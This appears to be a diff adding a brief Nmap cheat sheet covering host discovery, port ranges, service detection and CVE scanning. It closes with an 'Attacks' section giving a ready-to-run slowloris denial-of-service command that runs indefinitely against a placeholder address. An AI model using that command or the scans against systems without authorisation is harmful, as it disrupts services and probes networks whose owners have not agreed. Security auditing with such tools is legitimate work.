@@ -1,0 +1,49 @@
+# NMap
+
+Nmap ("Network Mapper") is a free and open source utility for network discovery and security auditing.
+
+## General Syntax
+```shell
+nmap [flags] host(s)
+```
+
+## Host Discovery
+
+```shell filename="ping_scan.sh" copy
+# Find what hosts are up.  Light reconnaissance without attracting much attention.
+nmap -sn 192.168.1.0/24
+```
+
+## Ports
+
+Flags
+```shell
+-p # Specify a single port, multiple ports (separated by a comma) or a port range (for example 20-25).
+-p- # All possible ports
+-top-ports x # Most common x ports
+```
+
+Commands
+```shell filename="port_scan.sh" copy
+# Scan a range of ports.
+nmap -p 1-65535 192.168.1.0
+```
+
+## Services
+
+```shell filename="service_detection.sh" copy
+nmap -sV localhost
+```
+
+## Vulnerabilities
+```shell filename="vulnerabilities.sh" copy
+# Scan for known CVEs
+nmap -Pn -script vuln 192.168.1.105
+```
+
+
+## Attacks
+```shell filename="attacks.sh" copy
+# DOS Attack
+nmap -p 80 -max-parallelism 800 -Pn -script http-slowloris -script-args http-slowloris.runforever=true X.X.X.X
+```
